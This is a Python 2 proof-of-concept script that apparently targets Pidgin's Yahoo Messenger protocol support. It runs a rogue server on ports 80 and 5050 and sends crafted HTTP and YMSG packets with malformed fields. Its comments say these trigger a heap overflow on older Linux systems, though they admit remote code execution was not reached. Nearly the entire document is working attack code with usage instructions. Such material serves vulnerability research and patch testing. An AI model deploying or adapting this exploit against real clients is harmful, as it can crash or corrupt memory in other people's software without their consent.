# This Vulnerability may can be explotable in an old linux system where malloc(0) alloc 16 bytes
# In this condition the vulnerability deal in a heap overflow
# The Vulnerability only exist in the TCP Protocol, UDP is not vulnerable
# At the moment i can't write a exploit dealing in a remote code execution
# Use: python server.py ip port
import sys
import time
import socket

ip = sys.argv[1]
port = 80 # 5060
username = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
s.bind((ip, port))
s.listen(1)
print "[#] Listening in TCP: "+ip+":"+str(port)

while True:
	connection, client_address = s.accept()
	data = connection.recv(1024) # buffer size is 1024 bytes
	print "Received data: \n"+data

	if(data.find("capacity") > -1):
		response = '''HTTP/1.1 200 OK\r\ncache-control: max-age=0, must-revalidate\r\ncontent-type: text/plain; charset=utf-8\r\ncontent-length: 47\r\n\r\nCOLO_CAPACITY=1\r\n&#3000;\r\nCS_IP_ADDRESS=192.168.1.2\r\n\r\n&#3000;'''
		print "[#] Sending response to CAPACITY request"
		connection.send(response)
		break;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
s.bind((ip, 5050))
s.listen(1)
print "[#] Listening in TCP: "+ip+":"+str(port)

while True:
	connection, client_address = s.accept()
	data = connection.recv(1024) # buffer size is 1024 bytes
	print "Received data: \n"+data

	if(data.find("YMSG") > -1):
		response = '''YMSG...	.Q.W.......41..pidgin9669..13..&#3000;..2..&#3000;..94..g*g|h%z*8+3+l%4&c&1&l^(t^e^c^i^z^y)^r^2^v^1^o^8^(j)^v..&#3000;'''
		print "[#] Sending response to STREAM request"
		connection.send(response)

		response = '''YMSG...	...U.......43..pidgin9669..89..pidgin9669..90..1..100..0..101....149..JKkKfIoSU_IBXOEDqu9PCA--..150..VeeVW0_aXFadgTonsFsw8w--..151..6c_mwwlv33dmlKuk4ThJ4w--..213..0..216..pidgin9669..254....281..2..300..444..440..0..301..444..462..1..470..us..YMSG...	.p.........4302..318..300..318..65..Friends..302..319..300..319..7..YahooMessenger..301..319..303..319..301..318..303..318..YMSG...	...........4241..0..YMSG...	.0.........4300..507..509..0..512..1..513..35793..301..507..YMSG...	...........4302..312..300..312..313..2..314..0..301..312..300..312..313..6..314..-1..301..312..300..312..313..4..314..0..301..312..300..312..313..8..314..1..301..312..300..312..313..9..314..900..301..312..303..312..YMSG...	...........4143..60..144..1..'''
		print "[#] Sending response to STREAM request"
		connection.send(response)
		
		response = '''&#3000;YMSG...............410..0..19....47..0..YMSG...............40..pidgin9669..YMSG.....A.K.......449..TYPING..1..pidgin9669..14.. ..13..1..5..pidgin9669..1002..1..YMSG.....O..ZU.V...41..pidgin9669..5..pidgin9669..97..1..14..hey!..63..;0..64..0..1002..1..206..0..YMSG.....A.K.......449..TYPING..1..pidgin9669..14.. ..13..0..5..pidgin9669..1002..1..YMSG.....A.K.......449..TYPING..1..pidgin9669..14.. ..13..1..5..pidgin9669..1002..1..YMSG.....N..ZU.V...41..pidgin9669..5..pidgin9669..97..1..14..   ..63..;0..64..0..1002..1..206..0..YMSG..&#3000;...A.K....&#3000;...449..TYPING..1..pidgin9669..14.. ..13..0..5..pidgin9669..1002..1..YMSG.....A.K.......449..TYPING..1..pidgin9669..14.. ..13..1..5..pidgin9669..1002..1..YMSG.....Q..ZU.V...41..pidgin9669&#3000;..5..pidgin9669..97..1..14..&#3000;..63..;0..64..0..1002..1..206..0..YMSG.....A.K..&#3000;.....449..TYPING..1..pidgin9669..14..&#3000; ..13..0..5..pidgin9669&#3000;..1002..1..YMSG.......&#3000;........40..pidgin9669..&#3000;'''
		print "[#] Sending response to STREAM request"
		connection.send(response)
